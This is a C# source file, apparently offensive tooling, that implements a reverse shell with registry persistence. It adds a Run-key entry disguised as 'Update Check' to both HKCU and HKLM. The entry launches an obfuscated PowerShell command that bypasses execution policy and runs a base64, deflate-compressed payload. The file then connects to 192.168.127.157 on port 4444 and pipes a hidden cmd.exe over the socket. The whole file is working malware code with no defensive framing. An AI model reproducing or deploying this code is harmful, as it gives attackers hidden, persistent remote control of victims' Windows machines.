using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Net.Sockets;
using Microsoft.Win32;

namespace SharpThrough
{
    public class RS
    {
      
        public RS(){
            Main();
        }
        static StreamWriter streamWriter;

        public static void Main()
        {
            RegistryKey first_key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            RegistryKey second_key = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            modifyReg(first_key);
            modifyReg(second_key);
            string ip = "192.168.127.157";
            int port = 4444;
            using (TcpClient client = new TcpClient(ip, port))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);
                        StringBuilder strInput = new StringBuilder();

                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.ErrorDataReceived += P_ErrorDataReceived;
                        p.Start();
                        p.BeginOutputReadLine();
                        p.BeginErrorReadLine();

                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            //strInput.Append("\n");
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

        private static void P_ErrorDataReceived(object sender, DataReceivedEventArgs e)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(e.Data))
            {
                try
                {
                    strOutput.Append(e.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err)
                {}
            }
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err){}
            }
        }
        private static void modifyReg(RegistryKey key){
            if (key != null){
            try{
                var launch = "cMd.eXE /c   pOweRSHeLL  -noNIntERa -WInDows  1 -NOpROf -NoLO -ExECutiOnPOLIc BypasS -comMAND   \" .( $VERBOsepREfeREnCe.tOstriNG()[1,3]+'X'-JOin'')( NEW-oBJeCT SYStEm.io.sTReAmrEADer((NEW-oBJeCT sYStem.iO.cOmPrEsSion.DEFlATESTrEAM( [IO.memoRyStREaM][CONVErT]::fROmBaSE64STrINg('zVhNb9NAED3nX8yhYFtqIqpWHFpxqFAplkJASU5EUVVVCBogQW3FJfS/45Biz8d7a6flQNWm693ZnTdv3swqznrVj2z+Nh/bYU8/bgeNhTNojKRe2z6JM2vsjYG1QnPb6b+P4pFGUxvMTrCbM5o1iFY0pgBRD3dB1/g1zFvs0gtJ0bEYdEIOiPFGftS0pSDGL2C7zr+AUeCDI6mtVDhMMkhXMfnuRGpHXdePlAxArzu3g+ptXEh4QQT14L9XgwDnoBSYDWDDe3504h31tA3U5iAjKFNEWm05EOXC8+4yLP5QEBbUcwewUfkIbIiBlyVooLuLwkWCN1DdP6IpRH1DBkAZMPU8LVh3AnJiTkjlC3bptupOqFUv8+x4RYEJq8iobTuj6yCc1TVbyA3ORYp7CU9db7aeCiLUBIrXF1bjjAsvJT26UefXA0Ed2bogWxP+QnJieYJsS2MonnjSnRBwSQENwGmJiRkSSgQcEXkgYoxV54sDckYtYCiaDXe8vpGMF72R6kYLGOFvSaPnWfSudMl3ymnw174tMojlpchurQ/cfnlbgJyT00IOYvyg7hRwWrK4hKiQ0J1sAbjANJtpT9rKLtObCwoPOYleAt+dYvbbvIV+NhedTw+5gyXwFYgiDdswEnwAbZJocQXDPgYBhSNQoflqcgdj4lklsT1YbLzuAyMes4QxW/NySF0U0U+NkpUYBBz2eTepoFkmnAISEYAaxQkAM6hvEXTi1206WioVNGZfNclMJeUce5aNIArDyYSFaYwTkrKBBOTWJmonRoQAYnW1FCzz3qILO6VNkq8o6XUBxEK+chFG05ca6TyOS4tTTSQ6ET7S334xEl9bjZ2TRtSNsAUDqIbAuCR5DfdbsAM6T2cqJT0D0+PAzwCm1tQj8KbfUBmNgdeCCOkOb6fIlwWqL8sV6kfpmeSBT+VK7QH+sJgNU2qnxJFdtQA61AScdb1ip7px+0i4rN/12nf7SXxvdJSNsVSz/0ROhHomKFQkIOGY7SRbBg9nPu62pU2I7DVrVozZL3m23rv6efbm6yvZu5D+1eTDsJxKJtVvtSbr6n92YlaqhWp+72Iw/DQ6n76V/sG93MuJPM8ln03ubsrR+TzLBsvV+N3p8PrjWTE7PNw/Otg/ejnvL96Xyywr/hiOy9Hn+fHxYnU9yiXL9vN8C2T2YjB4GD646B8Uc+kvVuWysisG03H5/XZ6Op7mW5zFYPLjWznNN9CKDep1dX45uptXEfUvb2X2+svlzbyoQBZFcf8b') , [iO.cOMPRessioN.CoMprESsIONMOdE]::DEcoMPResS ) ) , [TEXt.ENCoDing]::asciI) ).reAdTOEnd()\"";
                key.SetValue("Update Check", launch);
                key.Close();
            }
            catch (Exception err){{}}
            }
        }
    }
}
